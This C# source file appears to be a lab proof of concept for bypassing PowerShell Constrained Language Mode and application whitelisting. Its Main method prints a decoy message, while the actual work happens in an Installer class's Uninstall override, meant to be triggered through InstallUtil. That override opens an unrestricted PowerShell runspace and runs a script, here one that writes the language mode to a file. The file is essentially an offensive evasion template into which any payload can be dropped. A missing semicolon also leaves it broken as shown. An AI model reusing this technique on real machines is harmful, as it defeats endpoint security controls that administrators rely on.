using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
//We need to import the references in visual studio Solution Explorer and select Add Reference
//Solution Explorer ->  Add References -> Assemblies -> System.Configuration.Install
using System.Configuration.Install;


namespace Bypass
{
  class Program
  {
    static void Main(string[] args)
    {
     Console.WriteLine("nothing here")
    }
  }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
      public override void Uninstall(System.Collections.IDictionary savedState)
        {
          //create a runspace object
          Runspace rs = RunspaceFactory.CreateRunspace();
          rs.Open();
          String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\mst\\test.txt";
          
          PowerShell ps = PowerShell.Create();
          ps.Runspace = rs;
          ps.AddScript(cmd);
          ps.Invoke();
          rs.Close();
        }
    
    
     }
  
}